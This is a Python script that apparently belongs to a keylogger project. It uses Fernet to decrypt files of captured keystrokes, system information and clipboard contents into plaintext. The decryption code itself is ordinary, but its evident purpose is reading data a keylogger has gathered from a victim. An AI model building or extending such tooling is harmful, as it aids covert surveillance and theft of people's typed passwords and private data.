from cryptography.fernet import Fernet

# Inset same key from GenerateKey.py
key = " "

keys_information_e = "e_keys_info.txt"
system_information_e = "e_system_info.txt"
clipboard_information_e = "e_clipboard.txt"

encrypted_files = [keys_information_e, system_information_e, clipboard_information_e]

# Output files as. new names to prevent overwriting encrypted versions
decrypted_files = ["decrypted_keys.txt", "decrypted_system_info.txt", "decrypted_clipboard.txt"]

count = 0
fernet = Fernet(key)

for encrypted_file in encrypted_files:
    try:
        # Read encrypted file
        with open(encrypted_files[count], 'rb') as f:
            encrypted_data = f.read()
        
        # Decrypt the data
        decrypted_data = fernet.decrypt(encrypted_data)
        
        # Save to new file
        with open(decrypted_files[count], 'wb') as f:
            f.write(decrypted_data)
        
        print(f"Decrypted: {encrypted_files[count]} → {decrypted_files[count]}")
        count += 1

    except FileNotFoundError:
        print(f"File not found: {encrypted_files[count]}")
        count += 1
    except Exception as e:
        print(f"Decryption error for {encrypted_files[count]}: {e}")
        count += 1
